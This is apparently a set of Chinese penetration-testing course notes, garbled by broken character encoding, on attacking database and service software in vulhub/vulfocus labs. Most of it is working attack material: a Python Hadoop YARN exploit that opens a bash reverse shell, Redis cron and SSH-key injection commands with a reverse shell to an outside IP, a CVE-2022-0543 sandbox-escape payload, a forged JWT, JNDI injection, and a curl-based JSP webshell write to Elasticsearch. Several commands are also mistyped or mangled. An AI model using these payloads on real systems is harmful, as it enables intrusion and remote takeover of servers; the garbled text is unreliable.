<h4 id="å‰ç½®çŸ¥è¯†ï¼š-4"><a href="#å‰ç½®çŸ¥è¯†ï¼š-4" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>ç»„åˆçŒœæµ‹ï¼ˆç”±äºnatä¼šå¯¼è‡´ç«¯å£æ‰«æä¸åˆ°çœŸå®ç«¯å£ä¿¡æ¯ï¼‰ã€ä¿¡æ¯æ¥æºï¼ˆæŠ¥é”™ã€ç‰¹å¾ï¼‰<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µ-ç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ ç¿°&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼ç‰¹å®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰æ¼”ç¤ºæ¡ˆä¾‹ï¼š</p>
<p>Mysql-æœªæˆæƒè®¿é—®-CVE-2012-2122åˆ©ç”¨<br>Hadoop-.æœªæˆæƒè®¿é—®-å†…ç½®é…åˆå‘½ä»¤æ‰§è¡ŒRCE<br>Redis-æœªæˆæƒè®¿é—®-Webshell&amp;ä»»åŠ¡&amp;å¯†åŒ™&amp;RCEç­‰</p>
<p><strong>Mysql-æœªæˆæƒè®¿é—®-CVE-2012-2122åˆ©ç”¨</strong><br>å¤ç°ç¯å¢ƒï¼švulhub      å‡ºç°çš„å¯èƒ½æ€§ä¸å¤§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h you-ip -P3306 ; done </span><br></pre></td></tr></table></figure>

<p>æ¼æ´å¤ç°ï¼š</p>
<p>1ã€vulhubå¼€å¯æ¼æ´ç¯å¢ƒ</p>
<p>2ã€æ”»å‡»æœºï¼škaliæ‰«æç›®æ ‡ç«¯å£å¹¶éªŒè¯</p>
<p><strong>Hadoop-æœªæˆæƒè®¿é—®-å†…ç½®é…åˆå‘½ä»¤æ‰§è¡ŒRCE</strong><br>å¤ç°ç¯å¢ƒï¼švulfocus<br>æ€è·¯ï¼šè®¿é—®ç‰¹å®š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<p>æ¼æ´å¤ç°ï¼š<br>1ã€vulhubæ­å»ºhadoopæ¼æ´ç¯å¢ƒ</p>
<p>2ã€æ”»å‡»æœºkaliå¼€å¯ncç›‘å¬ç«¯å£ï¼Œä½¿ç”¨expæ”»å‡»åå¼¹shell</p>
<p>#Redis-æœªæˆæƒè®¿é—®-Webshell&amp;ä»»åŠ¡&amp;å¯†åŒ™&amp;RCEç­‰<br>1ã€å†™Webshelléœ€å¾—åˆ°Webè·¯å¾„<br>åˆ©ç”¨æ¡ä»¶ï¼šWebç›®å½•æƒé™å¯è¯»å†™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /tmp</span><br><span class="line">#è®¾ç½®WEBå†™å…¥ç›®å½•</span><br><span class="line">config set dbfilename1.phpè®¾ç½®å†™å…¥æ–‡ä»¶å</span><br><span class="line">set test&quot;c?php phpinfo):?&gt;&quot;#è®¾ç½®å†™å…¥æ–‡ä»¶ä»£ç </span><br><span class="line">bgsave</span><br><span class="line">#ä¿å­˜æ‰§è¡Œ</span><br><span class="line">save</span><br><span class="line">#ä¿å­˜æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šéƒ¨åˆ†æ²¡ç›®å½•æƒé™è¯»å†™æƒé™</p>
<p>2ã€å†™å®šæ—¶ä»»åŠ¡åå•shell<br>åˆ©ç”¨æ¡ä»¶ï¼š<br>å…è®¸å¼‚åœ°ç™»å½•<br>å®‰å…¨æ¨¡å¼protected-modeå¤„äºå…³é—­çŠ¶æ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy â€œninin*****bash-&gt;&amp;/dev/tcp/47.94.236.117/55550&gt;&amp;1nnnâ€</span><br><span class="line">config set dbfilename x</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š<br>centosä¼šå¿½ç•¥ä¹±ç å»æ‰§è¡Œæ ¼å¼æ­£ç¡®çš„ä»»åŠ¡è®¡åˆ’<br>è€Œubuntuå¹¶ä¸ä¼šå¿½ç•¥è¿™äº›ä¹±Lç ï¼Œæ‰€ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥</p>
<p>3ã€å†™å…¥Linux ssh-keyå…¬é’¥<br>åˆ©ç”¨æ¡ä»¶ï¼š<br>å…è®¸å¼‚åœ°ç™»å½•<br>RedisæœåŠ¡ä½¿ç”¨ROOTè´¦å·å¯åŠ¨<br>å®‰å…¨æ¨¡å¼protected-modeå¤„äºå…³é—­çŠ¶æ€<br>å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen-t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e â€œninâ€;cat id_rsa.pub;echo-e&quot;nin&quot;)&gt;key.txt</span><br><span class="line">cat key.txt redis-cli-h 118.31.57.214 -x set xxx</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized keys</span><br><span class="line">save</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">ssh -i id rsa root@118.31.57.214</span><br></pre></td></tr></table></figure>

<p>4ã€RCEè‡ªåŠ¨åŒ–åˆ©ç”¨è„šæœ¬-vulfocus<br><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br>python redis-.masterâ€¦py-f123.58.236.76-p9830-L47.94.236.117-P8888-f<br>RedisModulesSDK&#x2F;exp.so -c â€œidâ€</p>
<p>5.æ–°æ¼æ´-æ²™ç®±ç»•è¿‡RCE CVE-2022-0543-vulfocus<br>Poc:æ‰§è¡Œidå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval &#x27;local io_I package.loadlib(â€œ/usr/lib/x86_64-linux-gnu/liblua5.1.so.0â€,â€œluaopen_ioâ€);</span><br><span class="line">local io io_Iï¼ˆï¼‰;local f=io.popen(â€œidâ€,â€œrâ€);local res f.read(â€œaâ€);f:closeï¼ˆï¼‰;return resâ€™o</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_40882763/article/details/129742604?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&utm_relevant_index=5">https://blog.csdn.net/qq_40882763/article/details/129742604?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&amp;utm_relevant_index=5</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é™„åŠ ï¼šå…¶å®æ—¥å¸¸ä¸­æœ€å¸¸è§çš„å°±æ˜¯rediså’Œmysqlè¿™ä¸¤ç§æ•°æ®åº“æœ€å¥½å¸¸è§ï¼Œç‰¹åˆ«æ˜¯redisæœªæˆæƒè®¿é—®ï¼Œåœ¨å†…ç½‘æ¸—é€ä¸­å°±å¾ˆé‡è¦ï¼Œssrf+rediså†…ç½‘æ¸—é€å°±å¾ˆæœ‰åï¼Œè€Œä¸”é€šè¿‡redisçš„æœªæˆæƒè®¿é—®å¯ä»¥è¾¾åˆ°ä¸Šä¼ shellçš„ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³¨æ„ï¼šredisæ­å»ºæ—¶å€™åƒä¸‡ä¸è¦æ— å¯†ç æˆ–è€…å¼±å¯†ç ï¼Œä¸ç„¶å°±å¾ˆå®¹æ˜“ä¸­ç—…æ¯’</span><br><span class="line">å‚è€ƒï¼šhttps://juejin.cn/post/7195199519624003642   ä¼šå¯¼è‡´æœåŠ¡å™¨åŸºæœ¬å°±æ˜¯æ²¡ç”¨äº†</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬56å¤©-æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨-H2-Elasticsearch-CouchDB-Influxdbå¤ç°"><a href="#ç¬¬56å¤©-æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨-H2-Elasticsearch-CouchDB-Influxdbå¤ç°" class="headerlink" title="ç¬¬56å¤© æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdbå¤ç°"></a>ç¬¬56å¤© æœåŠ¡æ”»é˜²-æ•°æ®åº“å®‰å…¨&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdbå¤ç°</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‰è¨€ï¼šè¿™ä¸€å°èŠ‚ä¸­çš„æ•°æ®åº“ç°åœ¨ä½¿ç”¨å·²ç»å¾ˆå°‘äº†ï¼Œä¸»è¦å°±æ˜¯è¦çŸ¥é“è¿˜æœ‰è¿™äº›æ•°æ®åº“çš„å­˜åœ¨ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="çŸ¥è¯†ç‚¹ï¼š-36"><a href="#çŸ¥è¯†ç‚¹ï¼š-36" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æœåŠ¡æ”»é˜²æ•°æ®åº“ç±»å‹å®‰å…¨<br>2ã€influxdb,.æœªæˆæƒè®¿é—®wtéªŒè¯<br>3ã€H2 database-æœªæˆæƒè®¿é—®-é…ç½®ä¸å½“<br>4ã€CouchDB-æƒé™ç»•è¿‡é…åˆRCE-æ¼æ´<br>5ã€ElasticSearch-æ–‡ä»¶å†™å…¥&amp;RCE-æ¼æ´</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-2"><a href="#ç« èŠ‚å†…å®¹ï¼š-2" class="headerlink" title="#ç« èŠ‚å†…å®¹ï¼š"></a>#ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§æœåŠ¡åº”ç”¨çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶å¼±å£ä»¤çˆ†ç ´æ”»å‡»</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-5"><a href="#å‰ç½®çŸ¥è¯†ï¼š-5" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æŠ˜æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æŠ˜æœåŠ¡åˆ©ç”¨æ–¹å¼ç‰¹å®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-32"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-32" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>Influxdb-æœªæˆæƒè®¿é—®-JwtéªŒè¯ä¸å½“<br>H2database-æœªæˆæƒè®¿é—®-é…ç½®ä¸å½“<br>CouchDB-æƒé™ç»•è¿‡é…åˆRCE-æ¼æ´<br>ElasticSearch-æ–‡ä»¶å†™å…¥&amp;RCE-æ¼æ´</p>
<h4 id="nfluxdb-æœªæˆæƒè®¿é—®-JwtéªŒè¯ä¸å½“"><a href="#nfluxdb-æœªæˆæƒè®¿é—®-JwtéªŒè¯ä¸å½“" class="headerlink" title="#nfluxdb-æœªæˆæƒè®¿é—®-JwtéªŒè¯ä¸å½“"></a>#nfluxdb-æœªæˆæƒè®¿é—®-JwtéªŒè¯ä¸å½“</h4><p>é»˜è®¤ç«¯â˜ï¼š8086,8088<br>influxdbæ˜¯ä¸€æ¬¾è©åçš„æ—¶åºæ•°æ®åº“ï¼Œå…¶ä½¿ç”¨jwtä½œä¸ºé‰´æƒæ–¹å¼ã€‚åœ¨ç”¨æˆ·å¼€å¯äº†è®¤è¯ï¼Œä½†æœªè®¾<br>ç½®å‚æ•°shared-secretçš„æƒ…å†µä¸‹ï¼Œjwtçš„è®¤è¯å¯†é’¥ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶æ”»å‡»è€…å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·<br>èº«ä»½åœ¨influxdbä¸­æ‰§è¡ŒSQLè¯­å¥ï¼Œ<br>1ã€ä½¿ç”¨ <a href="https://jwt.io/">https://jwt.io/</a> ç”Ÿæˆä¸€ä¸ªå¸¦æœ‰ç©ºå¯†é’¥çš„æœ‰æ•ˆ JWT ä»¤ç‰Œï¼š      â€”â€”-JWTä¹Ÿæ˜¯CTFæ¯”èµ›ä¸­å¸¸è€ƒçŸ¥è¯†ç‚¹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">alg&quot;:&quot;HS256&quot;,</span><br><span class="line">&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">&quot;usemame&quot;:&quot;admin&quot;,</span><br><span class="line">&quot;exp&quot;:1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ˜¯ç®¡ç†å‘˜å¸æˆ·åç§°ï¼Œæ˜¯ä»¤ç‰Œè¿‡æœŸæ—¶é—´ã€‚æ‚¨åº”è¯¥è®¾ç½®ä¸ºå°†æ¥çš„æ—¶é—´ä»¥ä½¿å…¶ç”Ÿæ•ˆï¼šusername exp exp</p>
<p>ç„¶åæŠŠè¿™ä¸ªä»¤ç‰Œå¸¦åˆ°è¯·æ±‚ä¸­ï¼Œå¹¶æˆåŠŸåœ¨æœåŠ¡å™¨ä¸­æ‰§è¡ŒSQLè¯­å¥ï¼šshow users</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">db</span>=sample&amp;q=show+users</span></span><br><span class="line"><span class="language-ini"></span></span><br></pre></td></tr></table></figure>

<h4 id="H2-database-æœªæˆæƒè®¿é—®-é…ç½®ä¸å½“"><a href="#H2-database-æœªæˆæƒè®¿é—®-é…ç½®ä¸å½“" class="headerlink" title="#H2 database-æœªæˆæƒè®¿é—®-é…ç½®ä¸å½“"></a>#H2 database-æœªæˆæƒè®¿é—®-é…ç½®ä¸å½“</h4><p>é»˜è®¤ç«¯å£ï¼š20051<br>H2 databaseæ˜¯ä¸€æ¬¾Javaå†…å­˜æ•°æ®åº“ï¼Œå¤šç”¨äºå•å…ƒæµ‹è¯•ã€‚H2 databaseè‡ªå¸¦ä¸€ä¸ªWebç®¡ç†é¡µ<br>é¢ï¼Œåœ¨Springå¼€å‘ä¸­ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®å¦‚ä¸‹é€‰é¡¹ï¼Œå³å¯å…è®¸å¤–éƒ¨ç”¨æˆ·è®¿é—®Wbç®¡ç†é¡µé¢ï¼Œä¸”<br>æ²¡æœ‰é‰´æƒï¼šé»˜è®¤ç«¯å£ï¼š<br>spring.h2.console.enabled&#x3D;true<br>spring.h2.console.settings.web-allow-others&#x3D;true<br>åˆ©ç”¨è¿™ä¸ªç®¡ç†é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡ŒJNDæ³¨å…¥æ”»å‡»ï¼Œè¿›è€Œåœ¨ç›®æ ‡ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<br>ç®¡ç†é¡µé¢é»˜è®¤ä¸ºã€‚<a href="http://your-ip:8080/">http://your-ip:8080</a>  <a href="http://your-ip:8080/h2-console/">http://your-ip:8080/h2-console/</a><br>1ã€ä¸‹è½½JNDI-Injection-Exploit<br><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a><br>2ã€ç”Ÿæˆæ‰§è¡ŒRMI Payload-URL<br>-Cæ‰§è¡Œå‘½ä»¤-AæœåŠ¡å™¨åœ°å€<br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar-C touch &#x2F;tmp&#x2F;success -A 47.94.236.117</p>
<p>åœ¨æ”»å‡»æœºè¿è¡Œpocï¼Œæ‰§è¡Œåæ”»å‡»æœºä¼šç›‘å¬8180ã€1099ã€1389ç«¯å£</p>
<p>javax.naming.InitialContextæ˜¯ JNDI å·¥å‚ç±»åï¼ŒURL æ˜¯æ¶æ„çš„ RMI åœ°å€ã€‚rmi:&#x2F;&#x2F;evil:23456&#x2F;BypassByEL<br>æ”»å‡»æœºçš„ RMI æœåŠ¡å™¨æ”¶åˆ°ä»¥ä¸‹è¯·æ±‚ï¼š</p>
<p>touch &#x2F;tmp&#x2F;successå·²æˆåŠŸæ‰§è¡Œï¼š</p>
<h4 id="CouchDB-æƒé™ç»•è¿‡RCE-CVE-2017-12636"><a href="#CouchDB-æƒé™ç»•è¿‡RCE-CVE-2017-12636" class="headerlink" title="#CouchDB-æƒé™ç»•è¿‡RCE-CVE-2017-12636"></a>#CouchDB-æƒé™ç»•è¿‡RCE-CVE-2017-12636</h4><p>1ã€ä¸‹è½½exp.py<br>2ã€ä¿®æ”¹ç›®æ ‡å’Œåå¼¹åœ°å€<br>3ã€Python3è°ƒç”¨æ‰§è¡Œå³å¯<br><a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
<h4 id="ElasticSearch-æ–‡ä»¶å†™å…¥-RCEæ¼æ´"><a href="#ElasticSearch-æ–‡ä»¶å†™å…¥-RCEæ¼æ´" class="headerlink" title="#ElasticSearch-æ–‡ä»¶å†™å…¥&amp;RCEæ¼æ´"></a>#ElasticSearch-æ–‡ä»¶å†™å…¥&amp;RCEæ¼æ´</h4><p>é»˜è®¤ç«¯å£ï¼š92009300<br>Elasticsearch RCE CVE-2014-3120<br>1ã€æ¼æ´éœ€è¦sä¸­è‡³å°‘å­˜åœ¨ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆåˆ›å»ºä¸€æ¡æ•°æ®</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /website/blog/HTTP/1.1</span><br><span class="line">Host:your-ip:9200</span><br><span class="line">Accept:*/</span><br><span class="line">Accept-Language:en</span><br><span class="line">User-Agent:Mozilla/5.0 (compatible;MSIE 9.0:Windows NT 6.1;Win64:x64:Trident/5.0)</span><br><span class="line">Connection:close</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:25</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&quot;xiaodi&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2ã€ç›´æ¥å‘åŒ…è§¦å‘æ‰§è¡Œå‘½ä»¤</p>
<p>Elasticsearchæ–‡ä»¶å†™å…¥wooyun2015110216<br>9200ä¸€è‚¡ä¸ºElasticSearchçš„å¸¸ç”¨ç«¯å£ï¼Œæ­¤æ¼æ´ç¯å¢ƒéœ€è¦ä¸ä¸­é—´ä»¶ä½¿ç”¨<br>1ã€å‘ç°9200ç«¯å£å­˜åœ¨elasti-searché¡µé¢ï¼Œ8080å­˜åœ¨tomcatç›®å½•<br>2ã€åˆ©ç”¨ElasticSearchå†™å…¥åé—¨åˆ°&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -XPOST http://123.58.236.76:31556/yz.jsp/yz jsp/1-d&#x27;</span><br><span class="line">[&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byteã€ã€‘</span><br><span class="line">&#123;47,116,101,115,116,46,106,115,112)ã€‹ï¼Œnew String(new byteã€ã€‘</span><br><span class="line">(114,119))).write(request.getParameter(new String(new byte[(102))).getBytesï¼ˆï¼‰;</span><br><span class="line">%&gt;&quot;-&quot;test&quot;</span><br><span class="line">curl -XPUT &#x27;http://123.58.236.76:31556/snapshot/yz.jsp&#x27;-d&#x27;</span><br><span class="line">&quot;type&quot;.&quot;fs&quot;,</span><br><span class="line">&quot;settings&quot;:&#123;</span><br><span class="line">&quot;location&quot;:&quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class="line">&quot;compress&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.ã€è®¿é—®8080ç«¯å£snapshotâ€“yz jspiæ–‡ä»¶å†™å…¥ä»£ç åˆ°test jspä¸­<br><a href="http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz">http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz</a> jsp?f&#x3D;success<br><a href="http://123.58.236.76:31557/wwwroot/test.jsp">http://123.58.236.76:31557/wwwroot/test.jsp</a></p>
<h1 id="ç¬¬57å¤©-æœåŠ¡æ”»é˜²-åº”ç”¨åè®®-Rsync-SSH-RDP-FTP-æ¼æ´æ‰¹é‡æ‰«æ-å£ä»¤æ‹†è§£"><a href="#ç¬¬57å¤©-æœåŠ¡æ”»é˜²-åº”ç”¨åè®®-Rsync-SSH-RDP-FTP-æ¼æ´æ‰¹é‡æ‰«æ-å£ä»¤æ‹†è§£" class="headerlink" title="ç¬¬57å¤© æœåŠ¡æ”»é˜²-åº”ç”¨åè®®&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;æ¼æ´æ‰¹é‡æ‰«æ&amp;å£ä»¤æ‹†è§£"></a>ç¬¬57å¤© æœåŠ¡æ”»é˜²-åº”ç”¨åè®®&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;æ¼æ´æ‰¹é‡æ‰«æ&amp;å£ä»¤æ‹†è§£</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-37"><a href="#çŸ¥è¯†ç‚¹ï¼š-37" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æœåŠ¡æ”»é˜²-è¿œç¨‹æ§åˆ¶&amp;æ–‡ä»¶ä¼ è¾“ç­‰<br>2ã€è¿œç¨‹æ§åˆ¶-RDP&amp;RDP&amp;å¼±å£ä»¤&amp;æ¼æ´<br>3ã€æ–‡ä»¶ä¼ è¾“-FTP&amp;Rsyc&amp;å¼±å£ä»¤&amp;æ¼æ´</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-3"><a href="#ç« èŠ‚å†…å®¹ï¼š-3" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§æœåŠ¡åº”ç”¨çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶-å¼±å£ä»¤çˆ†ç ´æ”»å‡»</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-6"><a href="#å‰ç½®çŸ¥è¯†ï¼š-6" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µ-ç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ ç®±&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼ç‰¹å®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-33"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-33" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>å£ä»¤çŒœè§£-Hydra-FTP&amp;RDP&amp;SSH<br>é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®-Rsyncæ–‡ä»¶å¤‡ä»½<br>é«˜ç«¯è¯¾ç¨‹-ç›´æ¥æœå“ˆ-MSF&amp;Fofaviewer<br>åè®®æ¼æ´-åº”ç”¨è½¯ä»¶-FTP&amp;Proftpdæ­å»º<br>åè®®æ¼æ´-åº”ç”¨è½¯ä»¶-SSH&amp;libssh&amp;Openssh</p>
